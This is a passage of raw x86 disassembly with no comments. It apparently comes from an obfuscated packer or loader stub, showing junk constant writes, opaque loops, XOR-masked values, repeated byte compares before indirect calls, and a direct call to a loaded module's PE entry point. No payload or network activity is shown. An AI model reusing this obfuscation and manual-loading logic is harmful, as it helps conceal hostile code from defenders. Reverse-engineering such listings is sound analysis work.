  41c76c:	jl     0x41c79c
  41c772:	jmp    0x41c78f
  41c777:	push   0x426000
  41c77c:	push   0x29cf
  41c781:	push   0x6715
  41c786:	push   DWORD PTR [ebp-0x18]
  41c789:	call   DWORD PTR ds:0x430a24
  41c78f:	cmp    DWORD PTR ds:0x426e85,0x1b
  41c796:	jb     0x41c758
  41c79c:	lea    eax,[ecx+eax*1+0x3272fa]
  41c7a3:	mov    ecx,DWORD PTR [esp+0x1c]
  41c7a7:	mov    edx,DWORD PTR [esp+0x1c]
  41c7ab:	xor    edx,esi
  41c7ad:	sbb    DWORD PTR ds:0x426f29,0x426e8d
  41c7b7:	xor    ecx,esi
  41c7b9:	add    ecx,edx
  41c7bb:	sbb    edx,DWORD PTR ds:0x426f1d
  41c7c1:	mov    edx,DWORD PTR [esp+0x1c]
  41c7c5:	adc    DWORD PTR ds:0x426ef9,0x135a
  41c7cf:	xor    edx,esi
  41c7d1:	mov    DWORD PTR ds:0x426ee5,0x2979
  41c7db:	lea    ecx,[ecx+edx*1+0x9758ee]
  41c7e2:	mov    DWORD PTR ds:0x426f2d,0x689
  41c7ec:	mov    DWORD PTR [esp+0x28],eax
  41c7f0:	cmp    eax,ecx
  41c7f2:	mov    DWORD PTR ds:0x426efd,0x13db
  41c7fc:	jbe    0x41c58a
  41c802:	mov    eax,DWORD PTR [ebp+0xc]
  41c805:	mov    ds:0x42614d,eax
  41c80a:	and    DWORD PTR ds:0x426eb1,0x0
  41c814:	jmp    0x41c824
  41c819:	mov    eax,ds:0x426eb1
  41c81e:	inc    eax
  41c81f:	mov    ds:0x426eb1,eax
  41c824:	cmp    DWORD PTR ds:0x426eb1,0x19
  41c82b:	jae    0x41c851
  41c831:	cmp    DWORD PTR ds:0x426eb1,0x20
  41c838:	jl     0x41c851
  41c83e:	jmp    0x41c84c
  41c843:	push   DWORD PTR [ebp-0xc]
  41c846:	call   DWORD PTR ds:0x430a28
  41c84c:	jmp    0x41c819
  41c851:	mov    eax,DWORD PTR [ebp+0x10]
  41c854:	mov    ds:0x4263a9,eax
  41c859:	mov    ecx,DWORD PTR ds:0x42af61
  41c85f:	mov    eax,ds:0x42af6d
  41c864:	sub    eax,ecx
  41c866:	xor    ecx,DWORD PTR [ecx+eax*1]
  41c869:	mov    eax,ds:0x42614d
  41c86e:	inc    ecx
  41c86f:	mov    ecx,DWORD PTR [esp+0x44]
  41c873:	sbb    DWORD PTR ds:0x426f0d,0x426ed5
  41c87d:	sub    eax,ebx
  41c87f:	sub    DWORD PTR ds:0x426eed,0x426f05
  41c889:	xor    eax,esi
  41c88b:	mov    DWORD PTR [ecx],eax
  41c88d:	mov    DWORD PTR ds:0x426ea1,0x1d16
  41c897:	lea    eax,[esp+0x20]
  41c89b:	mov    DWORD PTR ds:0x426f1d,0x743e
  41c8a5:	mov    DWORD PTR [esp+0x4c],eax
  41c8a9:	mov    DWORD PTR ds:0x426eb5,0x1725
  41c8b3:	lea    eax,[ebp+0x4]
  41c8b6:	mov    DWORD PTR ds:0x426f0d,0x331f
  41c8c0:	mov    DWORD PTR [esp+0x20],eax
  41c8c4:	mov    DWORD PTR ds:0x426ea1,0x4fd1
  41c8ce:	mov    al,ds:0x426537
  41c8d3:	cmp    al,BYTE PTR ds:0x426542
  41c8d9:	jne    0x41c211
  41c8df:	mov    al,ds:0x426554
  41c8e4:	mov    DWORD PTR ds:0x426e99,0x22c3
  41c8ee:	cmp    al,BYTE PTR ds:0x426563
  41c8f4:	mov    DWORD PTR ds:0x426f21,0x5c30
  41c8fe:	jne    0x41c211
  41c904:	sub    DWORD PTR ds:0x426eb5,0x53da
  41c90e:	push   0x42656d
  41c913:	sbb    DWORD PTR ds:0x426f0d,0x426f15
  41c91d:	push   0x42657d
  41c922:	sbb    DWORD PTR ds:0x426e81,0x426e95
  41c92c:	call   edi
  41c92e:	test   eax,eax
  41c930:	mov    DWORD PTR ds:0x426f09,0x3f7d
  41c93a:	je     0x41c211
  41c940:	mov    al,ds:0x426593
  41c945:	mov    DWORD PTR ds:0x426f09,0x7a71
  41c94f:	cmp    al,BYTE PTR ds:0x42659e
  41c955:	mov    DWORD PTR ds:0x426f21,0x448e
  41c95f:	jne    0x41c211
  41c965:	mov    al,ds:0x4265b0
  41c96a:	cmp    al,BYTE PTR ds:0x4265bf
  41c970:	jne    0x41c211
  41c976:	push   0x4265c9
  41c97b:	add    DWORD PTR ds:0x426eb9,0x4508
  41c985:	push   0x4265d9
  41c98a:	call   edi
  41c98c:	test   eax,eax
  41c98e:	je     0x41c211
  41c994:	mov    DWORD PTR ds:0x426ed1,0x4635
  41c99e:	mov    al,ds:0x4265ef
  41c9a3:	mov    DWORD PTR ds:0x426f11,0x2d29
  41c9ad:	cmp    al,BYTE PTR ds:0x4265fa
  41c9b3:	mov    DWORD PTR ds:0x426f1d,0x5285
  41c9bd:	jne    0x41c211
  41c9c3:	mov    DWORD PTR ds:0x426ecd,0x17c5
  41c9cd:	mov    al,ds:0x42660c
  41c9d2:	mov    DWORD PTR ds:0x426ecd,0x1f4b
  41c9dc:	cmp    al,BYTE PTR ds:0x42661b
  41c9e2:	jne    0x41c211
  41c9e8:	push   0x426625
  41c9ed:	adc    DWORD PTR ds:0x426ef1,0x426ee5
  41c9f7:	push   0x426635
  41c9fc:	call   edi
  41c9fe:	adc    DWORD PTR ds:0x426edd,0x72d
  41ca08:	test   eax,eax
  41ca0a:	je     0x41c211
  41ca10:	mov    DWORD PTR ds:0x426ed9,0x3296
  41ca1a:	mov    al,ds:0x42664b
  41ca1f:	mov    DWORD PTR ds:0x426e91,0x9e5
  41ca29:	cmp    al,BYTE PTR ds:0x426656
  41ca2f:	mov    DWORD PTR ds:0x426ee1,0x4731
  41ca39:	jne    0x41c211
  41ca3f:	mov    al,ds:0x426668
  41ca44:	cmp    al,BYTE PTR ds:0x426677
  41ca4a:	jne    0x41c211
  41ca50:	xor    DWORD PTR ds:0x426e85,0x78df
  41ca5a:	push   0x426681
  41ca5f:	push   0x426691
  41ca64:	call   edi
  41ca66:	test   eax,eax
  41ca68:	je     0x41c211
  41ca6e:	mov    DWORD PTR ds:0x426efd,0x48d1
  41ca78:	mov    al,ds:0x4266a7
  41ca7d:	mov    DWORD PTR ds:0x426eb1,0x58ba
  41ca87:	cmp    al,BYTE PTR ds:0x4266b2
  41ca8d:	jne    0x41c211
  41ca93:	mov    al,ds:0x4266c4
  41ca98:	mov    DWORD PTR ds:0x426ea9,0x5172
  41caa2:	cmp    al,BYTE PTR ds:0x4266d3
  41caa8:	mov    DWORD PTR ds:0x426ecd,0x25dc
  41cab2:	jne    0x41c211
  41cab8:	add    DWORD PTR ds:0x426ef5,0x426ea9
  41cac2:	push   0x4266dd
  41cac7:	mov    DWORD PTR ds:0x426f1d,0x534b
  41cad1:	push   0x4266ed
  41cad6:	xor    DWORD PTR ds:0x426e8d,0x426e89
  41cae0:	call   edi
  41cae2:	test   eax,eax
  41cae4:	mov    DWORD PTR ds:0x426f09,0x17e9
  41caee:	je     0x41c211
  41caf4:	mov    DWORD PTR ds:0x426f15,0x546d
  41cafe:	mov    al,ds:0x426703
  41cb03:	mov    DWORD PTR ds:0x426ec9,0x6884
  41cb0d:	cmp    al,BYTE PTR ds:0x42670e
  41cb13:	mov    DWORD PTR ds:0x426e95,0x724e
  41cb1d:	jne    0x41c211
  41cb23:	mov    DWORD PTR ds:0x426eb1,0x7b3e
  41cb2d:	mov    al,ds:0x426720
  41cb32:	mov    DWORD PTR ds:0x426ea9,0xb8a
  41cb3c:	cmp    al,BYTE PTR ds:0x42672f
  41cb42:	mov    DWORD PTR ds:0x426ea5,0xfff
  41cb4c:	jne    0x41c211
  41cb52:	adc    DWORD PTR ds:0x426e81,0x426ed5
  41cb5c:	push   0x426739
  41cb61:	push   0x426749
  41cb66:	call   edi
  41cb68:	mov    DWORD PTR ds:0x426eb1,0x513e
  41cb72:	test   eax,eax
  41cb74:	je     0x41c211
  41cb7a:	mov    al,ds:0x42675f
  41cb7f:	mov    DWORD PTR ds:0x426e8d,0x24d0
  41cb89:	cmp    al,BYTE PTR ds:0x42676a
  41cb8f:	jne    0x41c211
  41cb95:	mov    DWORD PTR ds:0x426eb1,0x7a1a
  41cb9f:	mov    al,ds:0x42677c
  41cba4:	mov    DWORD PTR ds:0x426ef5,0x1244
  41cbae:	cmp    al,BYTE PTR ds:0x42678b
  41cbb4:	mov    DWORD PTR ds:0x426ed1,0x3050
  41cbbe:	jne    0x41c211
  41cbc4:	sub    DWORD PTR ds:0x426ee1,0x426f25
  41cbce:	push   0x426795
  41cbd3:	add    DWORD PTR ds:0x426f11,0x40a8
  41cbdd:	push   0x4267a5
  41cbe2:	sub    DWORD PTR ds:0x426ef9,0x426e9d
  41cbec:	call   edi
  41cbee:	adc    DWORD PTR ds:0x426e99,0x426f0d
  41cbf8:	test   eax,eax
  41cbfa:	je     0x41c211
  41cc00:	mov    al,ds:0x4267bb
  41cc05:	mov    DWORD PTR ds:0x426f05,0xc7b
  41cc0f:	cmp    al,BYTE PTR ds:0x4267c6
  41cc15:	mov    DWORD PTR ds:0x426eb9,0x70f1
  41cc1f:	jne    0x41c211
  41cc25:	mov    al,ds:0x4267d8
  41cc2a:	mov    DWORD PTR ds:0x426f09,0x320
  41cc34:	cmp    al,BYTE PTR ds:0x4267e7
  41cc3a:	mov    DWORD PTR ds:0x426ee1,0xc80
  41cc44:	jne    0x41c211
  41cc4a:	sbb    DWORD PTR ds:0x426e85,0x426ea9
  41cc54:	push   0x4267f1
  41cc59:	adc    DWORD PTR ds:0x426f21,0x426f09
  41cc63:	push   0x426801
  41cc68:	call   edi
  41cc6a:	test   eax,eax
  41cc6c:	mov    DWORD PTR ds:0x426e9d,0x1d82
  41cc76:	je     0x41c211
  41cc7c:	mov    DWORD PTR ds:0x426e8d,0x4c1f
  41cc86:	mov    al,ds:0x426817
  41cc8b:	mov    DWORD PTR ds:0x426ebd,0x2305
  41cc95:	cmp    al,BYTE PTR ds:0x426822
  41cc9b:	mov    DWORD PTR ds:0x426e85,0x52ee
  41cca5:	jne    0x41c211
  41ccab:	mov    DWORD PTR ds:0x426eed,0x1308
  41ccb5:	mov    al,ds:0x426834
  41ccba:	cmp    al,BYTE PTR ds:0x426843
  41ccc0:	mov    DWORD PTR ds:0x426ea9,0x1ac4
  41ccca:	jne    0x41c211
  41ccd0:	push   0x42684d
  41ccd5:	push   0x42685d
  41ccda:	call   edi
  41ccdc:	xor    DWORD PTR ds:0x426eb5,0x537b
  41cce6:	test   eax,eax
  41cce8:	mov    DWORD PTR ds:0x426f2d,0x4412
  41ccf2:	je     0x41c211
  41ccf8:	mov    al,ds:0x426873
  41ccfd:	mov    DWORD PTR ds:0x426eb1,0x52c5
  41cd07:	cmp    al,BYTE PTR ds:0x42687e
  41cd0d:	mov    DWORD PTR ds:0x426f01,0x16df
  41cd17:	jne    0x41c211
  41cd1d:	mov    DWORD PTR ds:0x426ee1,0xd56
  41cd27:	mov    al,ds:0x426890
  41cd2c:	mov    DWORD PTR ds:0x426ed1,0x624d
  41cd36:	cmp    al,BYTE PTR ds:0x42689f
  41cd3c:	mov    DWORD PTR ds:0x426e95,0x6fa7
  41cd46:	jne    0x41c211
  41cd4c:	push   0x4268a9
  41cd51:	push   0x4268b9
  41cd56:	call   edi
  41cd58:	test   eax,eax
  41cd5a:	je     0x41c211
  41cd60:	mov    al,ds:0x4268cf
  41cd65:	mov    DWORD PTR ds:0x426ea5,0x6b61
  41cd6f:	cmp    al,BYTE PTR ds:0x4268da
  41cd75:	mov    DWORD PTR ds:0x426ef1,0x607d
  41cd7f:	jne    0x41c211
  41cd85:	mov    al,ds:0x4268ec
  41cd8a:	mov    DWORD PTR ds:0x426f11,0x76ce
  41cd94:	cmp    al,BYTE PTR ds:0x4268fb
  41cd9a:	mov    DWORD PTR ds:0x426ea9,0x7be9
  41cda4:	jne    0x41c211
  41cdaa:	push   0x426905
  41cdaf:	xor    DWORD PTR ds:0x426e89,0x5d69
  41cdb9:	push   0x426915
  41cdbe:	call   edi
  41cdc0:	test   eax,eax
  41cdc2:	je     0x41c211
  41cdc8:	mov    al,ds:0x42692b
  41cdcd:	mov    DWORD PTR ds:0x426eed,0x2af5
  41cdd7:	cmp    al,BYTE PTR ds:0x426936
  41cddd:	mov    DWORD PTR ds:0x426ed9,0x56c9
  41cde7:	jne    0x41c211
  41cded:	mov    DWORD PTR ds:0x426f09,0x21f5
  41cdf7:	mov    al,ds:0x426948
  41cdfc:	cmp    al,BYTE PTR ds:0x426957
  41ce02:	jne    0x41c211
  41ce08:	push   0x426961
  41ce0d:	sub    DWORD PTR ds:0x426ef1,0x426f19
  41ce17:	push   0x426971
  41ce1c:	call   edi
  41ce1e:	or     DWORD PTR ds:0x426f11,0x426ea1
  41ce28:	test   eax,eax
  41ce2a:	je     0x41c211
  41ce30:	mov    DWORD PTR ds:0x426f1d,0x33c9
  41ce3a:	mov    al,ds:0x426987
  41ce3f:	cmp    al,BYTE PTR ds:0x426992
  41ce45:	jne    0x41c211
  41ce4b:	mov    al,ds:0x4269a4
  41ce50:	cmp    al,BYTE PTR ds:0x4269b3
  41ce56:	jne    0x41c211
  41ce5c:	push   0x4269bd
  41ce61:	push   0x4269cd
  41ce66:	call   edi
  41ce68:	test   eax,eax
  41ce6a:	je     0x41c211
  41ce70:	mov    al,ds:0x4269e3
  41ce75:	cmp    al,BYTE PTR ds:0x4269ee
  41ce7b:	jne    0x41c211
  41ce81:	mov    al,ds:0x426a00
  41ce86:	cmp    al,BYTE PTR ds:0x426a0f
  41ce8c:	jne    0x41c211
  41ce92:	push   0x426a19
  41ce97:	push   0x426a29
  41ce9c:	call   edi
  41ce9e:	test   eax,eax
  41cea0:	je     0x41c211
  41cea6:	mov    al,ds:0x426a3f
  41ceab:	cmp    al,BYTE PTR ds:0x426a4a
  41ceb1:	jne    0x41c211
  41ceb7:	mov    al,ds:0x426a5c
  41cebc:	cmp    al,BYTE PTR ds:0x426a6b
  41cec2:	jne    0x41c211
  41cec8:	push   0x426a75
  41cecd:	push   0x426a85
  41ced2:	call   edi
  41ced4:	test   eax,eax
  41ced6:	je     0x41c211
  41cedc:	mov    al,ds:0x426a9b
  41cee1:	cmp    al,BYTE PTR ds:0x426aa6
  41cee7:	jne    0x41c211
  41ceed:	mov    al,ds:0x426ab8
  41cef2:	cmp    al,BYTE PTR ds:0x426ac7
  41cef8:	jne    0x41c211
  41cefe:	push   0x426ad1
  41cf03:	push   0x426ae1
  41cf08:	call   edi
  41cf0a:	test   eax,eax
  41cf0c:	je     0x41c211
  41cf12:	mov    al,ds:0x426af7
  41cf17:	cmp    al,BYTE PTR ds:0x426b02
  41cf1d:	jne    0x41c211
  41cf23:	mov    al,ds:0x426b14
  41cf28:	cmp    al,BYTE PTR ds:0x426b23
  41cf2e:	jne    0x41c211
  41cf34:	push   0x426b2d
  41cf39:	push   0x426b3d
  41cf3e:	call   edi
  41cf40:	test   eax,eax
  41cf42:	je     0x41c211
  41cf48:	mov    al,ds:0x426b53
  41cf4d:	cmp    al,BYTE PTR ds:0x426b5e
  41cf53:	jne    0x41c211
  41cf59:	mov    al,ds:0x426b70
  41cf5e:	cmp    al,BYTE PTR ds:0x426b7f
  41cf64:	jne    0x41c211
  41cf6a:	push   0x426b89
  41cf6f:	push   0x426b99
  41cf74:	call   edi
  41cf76:	test   eax,eax
  41cf78:	je     0x41c211
  41cf7e:	mov    al,ds:0x426baf
  41cf83:	cmp    al,BYTE PTR ds:0x426bba
  41cf89:	jne    0x41c211
  41cf8f:	mov    al,ds:0x426bcc
  41cf94:	cmp    al,BYTE PTR ds:0x426bdb
  41cf9a:	jne    0x41c211
  41cfa0:	push   0x426be5
  41cfa5:	push   0x426bf5
  41cfaa:	call   edi
  41cfac:	test   eax,eax
  41cfae:	je     0x41c211
  41cfb4:	mov    al,ds:0x426c0b
  41cfb9:	cmp    al,BYTE PTR ds:0x426c16
  41cfbf:	jne    0x41c211
  41cfc5:	mov    al,ds:0x426c28
  41cfca:	cmp    al,BYTE PTR ds:0x426c37
  41cfd0:	jne    0x41c211
  41cfd6:	push   0x426c41
  41cfdb:	push   0x426c51
  41cfe0:	call   edi
  41cfe2:	test   eax,eax
  41cfe4:	je     0x41c211
  41cfea:	mov    al,ds:0x426c67
  41cfef:	cmp    al,BYTE PTR ds:0x426c72
  41cff5:	jne    0x41c211
  41cffb:	mov    al,ds:0x426c84
  41d000:	cmp    al,BYTE PTR ds:0x426c93
  41d006:	jne    0x41c211
  41d00c:	push   0x426c9d
  41d011:	push   0x426cad
  41d016:	call   edi
  41d018:	test   eax,eax
  41d01a:	je     0x41c211
  41d020:	mov    eax,DWORD PTR [esp+0x34]
  41d024:	cmp    eax,0xf89c85b4
  41d029:	je     0x41d088
  41d02f:	mov    eax,DWORD PTR [esp+0x10]
  41d033:	mov    ecx,DWORD PTR [esp+0x30]
  41d037:	xor    eax,esi
  41d039:	add    eax,ebx
  41d03b:	cmp    eax,ecx
  41d03d:	je     0x41d088
  41d043:	mov    eax,ds:0x4262c9
  41d048:	mov    eax,DWORD PTR [eax+0x194]
  41d04e:	mov    ecx,DWORD PTR [eax]
  41d050:	mov    eax,DWORD PTR [ecx+0x3c]
  41d053:	push   DWORD PTR ds:0x4263a9
  41d059:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  41d05d:	push   DWORD PTR ds:0x42614d
  41d063:	add    eax,ecx
  41d065:	mov    ecx,DWORD PTR ds:0x4262c9
  41d06b:	mov    ecx,DWORD PTR [ecx+0x194]
  41d071:	push   DWORD PTR [ecx]
  41d073:	call   eax
  41d075:	mov    ecx,DWORD PTR ds:0x4262c9
  41d07b:	mov    ecx,DWORD PTR [ecx+0x1cc]
  41d081:	mov    DWORD PTR [ecx],eax
  41d083:	jmp    0x41d259
  41d088:	mov    eax,DWORD PTR [esp+0x10]
  41d08c:	mov    ecx,DWORD PTR [esp+0x48]
  41d090:	xor    eax,esi
  41d092:	add    eax,ebx
  41d094:	cmp    eax,ecx
  41d096:	jne    0x41d101
  41d09c:	mov    eax,DWORD PTR [esp+0x10]
  41d0a0:	mov    ecx,DWORD PTR ds:0x4262c9
  41d0a6:	mov    ecx,DWORD PTR [ecx+0x198]
  41d0ac:	xor    eax,esi
  41d0ae:	add    eax,ebx
  41d0b0:	cmp    eax,DWORD PTR [ecx]
  41d0b2:	jne    0x41d0da
  41d0b8:	mov    eax,DWORD PTR [esp+0x10]
  41d0bc:	push   0xffffffff
  41d0be:	push   0x70941f8a
  41d0c3:	xor    eax,esi
  41d0c5:	add    eax,ebx
  41d0c7:	push   eax
  41d0c8:	push   0xf89c85b9
  41d0cd:	push   DWORD PTR [esp+0x2c]
  41d0d1:	push   DWORD PTR [esp+0x24]
  41d0d5:	call   0x417355
  41d0da:	push   DWORD PTR [esp+0x1c]
  41d0de:	push   DWORD PTR [esp+0x14]
  41d0e2:	call   0x401000
  41d0e7:	mov    eax,DWORD PTR [esp+0x10]
  41d0eb:	xor    eax,esi
  41d0ed:	add    eax,ebx
  41d0ef:	mov    ds:0x426355,eax
  41d0f4:	mov    eax,DWORD PTR [esp+0x10]
  41d0f8:	xor    eax,esi
  41d0fa:	add    eax,ebx
  41d0fc:	mov    ds:0x42634d,eax
  41d101:	mov    eax,DWORD PTR [esp+0x20]
  41d105:	test   eax,eax
  41d107:	je     0x41d259
  41d10d:	mov    DWORD PTR [esp+0x50],0xf152c3c
  41d115:	mov    DWORD PTR [esp+0x54],0x712edcf
  41d11d:	mov    DWORD PTR [esp+0x58],0x373fc2d
  41d125:	mov    DWORD PTR [esp+0x5c],0x72670add
  41d12d:	call   0x416fa9
  41d132:	mov    eax,DWORD PTR [esp+0x24]
  41d136:	mov    eax,DWORD PTR [esp+0x1c]
  41d13a:	mov    DWORD PTR [esp+0x44],eax
  41d13e:	mov    eax,DWORD PTR [esp+0x10]
  41d142:	mov    DWORD PTR [esp+0x1c],eax
  41d146:	mov    eax,eax
  41d148:	mov    eax,ds:0x4262c9
  41d14d:	mov    ecx,DWORD PTR [eax+0x1c0]
  41d153:	mov    edx,DWORD PTR [ecx]
  41d155:	and    DWORD PTR [esp+0x3c],0x0
  41d15a:	mov    edi,0xfabdbecd
  41d15f:	add    edx,edi
  41d161:	adc    DWORD PTR [esp+0x3c],0xffffffff
  41d166:	mov    ecx,0x8a29a147
  41d16b:	xor    edx,ecx
  41d16d:	mov    DWORD PTR [esp+0x28],edx
  41d171:	mov    edx,DWORD PTR [esp+0x3c]
  41d175:	xor    edx,0x0
  41d178:	cmp    DWORD PTR [esp+0x28],0x70941f89
  41d180:	mov    DWORD PTR [esp+0x2c],edx
  41d184:	jne    0x41d193
  41d18a:	cmp    edx,0xffffffff
  41d18d:	je     0x41d1fc
  41d193:	mov    eax,DWORD PTR [eax+0x1c8]
  41d199:	mov    eax,DWORD PTR [eax]
  41d19b:	cdq    
  41d19c:	add    eax,edi
  41d19e:	adc    edx,0xffffffff
  41d1a1:	and    DWORD PTR [esp+0x3c],0x0
  41d1a6:	xor    edx,0x0
  41d1a9:	mov    DWORD PTR [esp+0x14],edx
  41d1ad:	mov    edx,DWORD PTR [esp+0x1c]
  41d1b1:	mov    DWORD PTR [esp+0x38],edx
  41d1b5:	xor    eax,ecx
  41d1b7:	add    DWORD PTR [esp+0x38],edi
  41d1bb:	mov    edx,DWORD PTR [esp+0x38]
  41d1bf:	adc    DWORD PTR [esp+0x3c],0xffffffff
  41d1c4:	xor    edx,ecx
  41d1c6:	mov    DWORD PTR [esp+0x28],edx
  41d1ca:	mov    edx,DWORD PTR [esp+0x3c]
  41d1ce:	xor    edx,0x0
  41d1d1:	mov    DWORD PTR [esp+0x2c],edx
  41d1d5:	cmp    DWORD PTR [esp+0x28],eax
  41d1d9:	jne    0x41d1eb
  41d1df:	mov    eax,DWORD PTR [esp+0x14]
  41d1e3:	cmp    edx,eax
  41d1e5:	je     0x41d1fc
  41d1eb:	mov    eax,DWORD PTR [esp+0x1c]
  41d1ef:	add    eax,DWORD PTR [esp+0x44]
  41d1f3:	mov    DWORD PTR [esp+0x1c],eax
  41d1f7:	jmp    0x41d259
  41d1fc:	mov    eax,ds:0x42634d
  41d201:	mov    edx,DWORD PTR ds:0x426355
  41d207:	xor    eax,edx
  41d209:	mov    ds:0x42634d,eax
  41d20e:	mov    edx,DWORD PTR ds:0x42634d
  41d214:	mov    eax,DWORD PTR [esp+0x20]
  41d218:	add    DWORD PTR [eax],edx
  41d21a:	mov    edx,DWORD PTR [esp+0x1c]
  41d21e:	mov    eax,ds:0x42634d
  41d223:	xor    edx,esi
  41d225:	add    edx,ebx
  41d227:	xor    ebx,ebx
  41d229:	add    edx,edi
  41d22b:	adc    ebx,0xffffffff
  41d22e:	xor    esi,esi
  41d230:	xor    edx,ecx
  41d232:	xor    ebx,0x0
  41d235:	add    eax,edi
  41d237:	adc    esi,0xffffffff
  41d23a:	xor    eax,ecx
  41d23c:	xor    esi,0x0
  41d23f:	cmp    eax,edx
  41d241:	jne    0x41d259
  41d247:	cmp    esi,ebx
  41d249:	jne    0x41d259
  41d24f:	mov    eax,ds:0x42634d
  41d254:	mov    ds:0x426355,eax
  41d259:	mov    eax,ds:0x4262c9
  41d25e:	push   0x4
  41d260:	add    eax,0x1cc
  41d265:	push   eax
  41d266:	lea    eax,[esp+0x2c]
  41d26a:	push   eax
  41d26b:	call   0x41d27f
  41d270:	mov    eax,DWORD PTR [esp+0x24]
  41d274:	mov    eax,DWORD PTR [eax]
  41d276:	pop    edi
  41d277:	pop    esi
  41d278:	pop    ebx
  41d279:	mov    esp,ebp
  41d27b:	pop    ebp
  41d27c:	ret    0xc
  41d27f:	push   ebp
  41d280:	mov    ebp,esp
  41d282:	sub    esp,0x10
  41d285:	mov    eax,ds:0x427c91
  41d28a:	mov    ecx,DWORD PTR ds:0x429d55
  41d290:	sub    eax,ecx
  41d292:	add    eax,DWORD PTR [eax+ecx*1]
  41d295:	mov    eax,0xf89c85b5
  41d29a:	and    DWORD PTR ds:0x426eb9,ecx
  41d2a0:	mov    DWORD PTR [ebp-0x4],eax
  41d2a3:	and    DWORD PTR ds:0x426f29,0x0
  41d2ad:	mov    edx,DWORD PTR ds:0x426f29
  41d2b3:	inc    edx
  41d2b4:	mov    DWORD PTR ds:0x426f29,edx
  41d2ba:	cmp    DWORD PTR ds:0x426f29,0xc
  41d2c1:	jge    0x41d300
  41d2c7:	jmp    0x41d2d7
  41d2cc:	push   0x4f6e
  41d2d1:	call   DWORD PTR ds:0x430a2c
  41d2d7:	cmp    DWORD PTR ds:0x426f29,0xb
  41d2de:	jne    0x41d2f3
  41d2e4:	xor    edx,edx
  41d2e6:	add    edx,DWORD PTR ds:0x426f29
  41d2ec:	inc    edx
  41d2ed:	mov    DWORD PTR ds:0x426f29,edx
  41d2f3:	cmp    DWORD PTR ds:0x426f29,0x14
  41d2fa:	jb     0x41d2ad
  41d300:	mov    DWORD PTR [ebp-0x8],0xf89c85b4
  41d307:	mov    edx,DWORD PTR ds:0x426ee9
  41d30d:	sbb    DWORD PTR ds:0x426f21,edx
  41d313:	mov    ecx,DWORD PTR [ebp-0x4]
  41d316:	mov    DWORD PTR ds:0x426ebd,0x1b
  41d320:	cmp    DWORD PTR ds:0x426ebd,0x0
  41d327:	je     0x41d371
  41d32d:	cmp    DWORD PTR ds:0x426ebd,0x2
  41d334:	jg     0x41d371
  41d33a:	jmp    0x41d345
  41d33f:	call   DWORD PTR ds:0x430a38
  41d345:	cmp    DWORD PTR ds:0x426ebd,0x3
  41d34c:	jne    0x41d35f
  41d352:	mov    edx,DWORD PTR ds:0x426ebd
  41d358:	dec    edx
  41d359:	mov    DWORD PTR ds:0x426ebd,edx
  41d35f:	mov    edx,DWORD PTR ds:0x426ebd
  41d365:	dec    edx
  41d366:	mov    DWORD PTR ds:0x426ebd,edx
  41d36c:	jmp    0x41d320
  41d371:	push   esi
  41d372:	or     edx,0x1404
  41d378:	mov    edx,0x75108b3
  41d37d:	mov    esi,DWORD PTR ds:0x426eb5
  41d383:	and    DWORD PTR ds:0x426e95,esi
  41d389:	xor    ecx,edx
  41d38b:	xor    esi,DWORD PTR ds:0x426eb9
  41d391:	mov    esi,0x3272fa
  41d396:	push   edi
  41d397:	xor    DWORD PTR ds:0x426ec5,0xe12
  41d3a1:	mov    edi,DWORD PTR [ebp+0x10]
  41d3a4:	add    ecx,esi
  41d3a6:	mov    DWORD PTR ds:0x426f09,0x182c
  41d3b0:	cmp    ecx,edi
  41d3b2:	je     0x41d4a2
  41d3b8:	mov    ecx,DWORD PTR [ebp-0x4]
  41d3bb:	movzx  edi,WORD PTR ds:0x426f09
  41d3c2:	add    DWORD PTR ds:0x426ea5,edi
  41d3c8:	mov    edi,DWORD PTR [ebp+0x10]
  41d3cb:	xor    eax,eax
  41d3cd:	xor    ecx,edx
  41d3cf:	add    ecx,esi
  41d3d1:	add    DWORD PTR ds:0x426ed1,0x330a
  41d3db:	add    edi,0xfabdbecd
  41d3e1:	mov    DWORD PTR ds:0x426ee5,0x5f33
  41d3eb:	adc    eax,0xffffffff
  41d3ee:	and    DWORD PTR ds:0x426ecd,0x4eeb
  41d3f8:	xor    eax,0x0
  41d3fb:	mov    DWORD PTR [ebp-0xc],eax
  41d3fe:	push   ebx
  41d3ff:	xor    ebx,ebx
  41d401:	xor    edi,0x8a29a147
  41d407:	mov    eax,ecx
  41d409:	add    eax,0xfabdbecd
  41d40e:	adc    ebx,0xffffffff
  41d411:	xor    eax,0x8a29a147
  41d416:	xor    ebx,0x0
  41d419:	cmp    eax,edi
  41d41b:	jne    0x41d434
  41d421:	cmp    ebx,DWORD PTR [ebp-0xc]
  41d424:	je     0x41d49c
  41d42a:	jmp    0x41d434
  41d42f:	mov    esi,0x3272fa
  41d434:	mov    eax,DWORD PTR [ebp-0x4]
  41d437:	mov    edi,DWORD PTR [ebp-0x8]
  41d43a:	xor    edi,edx
  41d43c:	add    edi,esi
  41d43e:	mov    esi,DWORD PTR [ebp+0x8]
  41d441:	imul   edi,ecx
  41d444:	mov    ebx,DWORD PTR [ebp+0xc]
  41d447:	xor    eax,edx
  41d449:	add    eax,ecx
  41d44b:	mov    al,BYTE PTR [ebx+eax*1+0x3272fa]
  41d452:	mov    BYTE PTR [edi+esi*1],al
  41d455:	mov    eax,DWORD PTR [ebp-0x8]
  41d458:	mov    esi,DWORD PTR [ebp+0x10]
  41d45b:	xor    eax,edx
  41d45d:	xor    ebx,ebx
  41d45f:	add    esi,0xfabdbecd
  41d465:	adc    ebx,0xffffffff
  41d468:	lea    ecx,[ecx+eax*1+0x3272fa]
  41d46f:	xor    edi,edi
  41d471:	xor    esi,0x8a29a147
  41d477:	xor    ebx,0x0
  41d47a:	mov    eax,ecx
  41d47c:	add    eax,0xfabdbecd
  41d481:	adc    edi,0xffffffff
  41d484:	xor    eax,0x8a29a147
  41d489:	xor    edi,0x0
  41d48c:	cmp    eax,esi
  41d48e:	jne    0x41d42f
  41d494:	cmp    edi,ebx
  41d496:	jne    0x41d42f
  41d49c:	mov    eax,0xf89c85b4
  41d4a1:	pop    ebx
  41d4a2:	pop    edi
  41d4a3:	pop    esi
  41d4a4:	leave  
  41d4a5:	ret    0xc
  41d4a8:	push   ebp
  41d4a9:	mov    ebp,esp
  41d4ab:	push   ecx
  41d4ac:	and    DWORD PTR ds:0x426e8d,0x0
  41d4b6:	mov    eax,ds:0x426e8d
  41d4bb:	inc    eax
  41d4bc:	mov    ds:0x426e8d,eax
  41d4c1:	cmp    DWORD PTR ds:0x426e8d,0x1c
  41d4c8:	jge    0x41d4eb
  41d4ce:	jmp    0x41d4de
  41d4d3:	push   0x5eb6
